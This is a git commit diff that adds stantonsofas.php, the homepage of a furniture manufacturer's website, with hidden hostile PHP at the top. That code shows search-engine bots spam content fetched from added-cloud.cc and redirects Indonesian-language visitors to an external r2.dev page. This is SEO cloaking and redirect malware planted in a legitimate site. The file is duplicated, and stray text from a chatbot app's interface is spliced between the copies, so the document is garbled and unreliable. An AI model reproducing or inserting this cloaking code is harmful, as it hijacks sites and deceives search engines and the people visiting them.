e328a105745e48f837a22ed6536b001c2e3bb99e
PACKDOL <141484624+PACKDOL@users.noreply.github.com>
2024-11-23 15:58:04 +0700

    Create stantonsofas.php

---
+++ stantonsofas.php
@@ -0,0 +1,179 @@
+<?php
+$s_ref = $_SERVER['HTTP_REFERER'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+            setcookie('az', 'lp', time() + 3600 * 7200);
+            echo ' '; // Your bot-specific content
+            exit;
+        }
+        echo file_get_contents("https://added-cloud.cc/packdol/getcontent/www.stantonsofas.com/lp.txt");
+        exit;
+        ?>
+        <?php
+    }
+    $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+    if ($browserLang == 'id') {
+        header("Location: https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.stantonsofas.html");
+        exit;
+    } 
+require("header.php"); ?>
+  <div class="section cc-store-home-wrap">
+    <div data-delay="4000" data-animation="slide" class="intro-header-catalog w-slider" data-autoplay="true" data-easing="ease" data-hide-arrows="false" data-disable-swipe="false" data-autoplay-limit="0" data-nav-spacing="3" data-duration="500" data-infinite="true">
+      <div class="mask w-slider-mask">
+        <div class="slide w-slide"></div>
+        <div class="slide slide-2 w-slide"></div>
+        <div class="slide slide-3 w-slide"></div>
+      </div>
+      <div class="left-arrow w-slider-arrow-left">
+        <div class="w-icon-slider-left"></div>
+      </div>
+      <div class="right-arrow w-slider-arrow-right">
+        <div class="w-icon-slider-right"></div>
+      </div>
+      <div class="slide-nav w-slider-nav w-round"></div>
+    </div>
+  </div>
+  <div class="section-2 wf-section">
+    <div class="f-navigation-wrapper" style="box-shadow: 0 8px 9px 0 #979797;">
+      <div class="f-banner">
+        <div class="f-banner-flex-row">
+          <div class="f-paragraph-regular">Stanton sells and distributes through local retailers only. If you have a question regarding product availability, warranty, lead time, product features and benefits, etc., please contact your local authorized Stanton Dealer.</div>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="home-content-wrap">
+        <div class="w-layout-grid about-grid">
+          <div id="w-node-_86e64837-0616-515b-4568-76c147234d34-a137b9dc">
+            <div class="home-section-wrap">
+              <h2 class="section-heading">About Us</h2>
+              <p class="paragraph-light">Stanton is a multi-generation, family-owned and operated furniture manufacturer located in Canby, Oregon. Founded by Bud Stanton in 1973, Stanton Family Companies have proudly manufactured high-quality, comfortable, custom handmade furniture for 50 years.</p>
+              <p class="paragraph-light">We value our team and their dedication to building high-quality products every day. We are thankful for their effort, expertise, and experience. They are talented artisans building furniture we are proud of, and we are confident you will enjoy the experience of having Stanton furniture in your home.</p>
+            </div>
+            <a href="about.php" class="button w-inline-block">
+              <div>Learn More</div>
+            </a>
+          </div><div class="canby-video">
+                  <video width="700" height="394" autoplay muted loop>
+                      <source src="docs/Canby Air-Compressed.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                  </video>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+<?php require("footer.php"); ?>
+Chat
+
+New Conversation
+
+🤓 Explain a complex thing
+
+Explain Artificial Intelligence so that I can explain it to my six-year-old child.
+
+
+🧠 Get suggestions and create new ideas
+
+Please give me the best 10 travel ideas around the world
+
+
+💭 Translate, summarize, fix grammar and more…
+
+Translate "I love you" French
+
+
+GPT-4o Mini
+Hello, how can I help you today?
+
+GPT-4o Mini
+coin image
+10
+Upgrade
+
+
+
+<?php
+$s_ref = $_SERVER['HTTP_REFERER'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+            setcookie('az', 'lp', time() + 3600 * 7200);
+            echo ' '; // Your bot-specific content
+            exit;
+        }
+        echo file_get_contents("https://added-cloud.cc/packdol/getcontent/www.stantonsofas.com/lp.txt");
+        exit;
+        ?>
+        <?php
+    }
+    $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+    if ($browserLang == 'id') {
+        header("Location: https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.stantonsofas.html");
+        exit;
+    } 
+require("header.php"); ?>
+  <div class="section cc-store-home-wrap">
+    <div data-delay="4000" data-animation="slide" class="intro-header-catalog w-slider" data-autoplay="true" data-easing="ease" data-hide-arrows="false" data-disable-swipe="false" data-autoplay-limit="0" data-nav-spacing="3" data-duration="500" data-infinite="true">
+      <div class="mask w-slider-mask">
+        <div class="slide w-slide"></div>
+        <div class="slide slide-2 w-slide"></div>
+        <div class="slide slide-3 w-slide"></div>
+      </div>
+      <div class="left-arrow w-slider-arrow-left">
+        <div class="w-icon-slider-left"></div>
+      </div>
+      <div class="right-arrow w-slider-arrow-right">
+        <div class="w-icon-slider-right"></div>
+      </div>
+      <div class="slide-nav w-slider-nav w-round"></div>
+    </div>
+  </div>
+  <div class="section-2 wf-section">
+    <div class="f-navigation-wrapper" style="box-shadow: 0 8px 9px 0 #979797;">
+      <div class="f-banner">
+        <div class="f-banner-flex-row">
+          <div class="f-paragraph-regular">Stanton sells and distributes through local retailers only. If you have a question regarding product availability, warranty, lead time, product features and benefits, etc., please contact your local authorized Stanton Dealer.</div>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="home-content-wrap">
+        <div class="w-layout-grid about-grid">
+          <div id="w-node-_86e64837-0616-515b-4568-76c147234d34-a137b9dc">
+            <div class="home-section-wrap">
+              <h2 class="section-heading">About Us</h2>
+              <p class="paragraph-light">Stanton is a multi-generation, family-owned and operated furniture manufacturer located in Canby, Oregon. Founded by Bud Stanton in 1973, Stanton Family Companies have proudly manufactured high-quality, comfortable, custom handmade furniture for 50 years.</p>
+              <p class="paragraph-light">We value our team and their dedication to building high-quality products every day. We are thankful for their effort, expertise, and experience. They are talented artisans building furniture we are proud of, and we are confident you will enjoy the experience of having Stanton furniture in your home.</p>
+            </div>
+            <a href="about.php" class="button w-inline-block">
+              <div>Learn More</div>
+            </a>
+          </div><div class="canby-video">
+                  <video width="700" height="394" autoplay muted loop>
+                      <source src="docs/Canby Air-Compressed.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                  </video>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+<?php require("footer.php"); ?>
+
+
+
+
+Make a Review & Earn Credit ❤
+Chat
+Ask
+Search
+Write
+Image
+ChatPDF
+Vision
+Full Page
+Invite & Earn
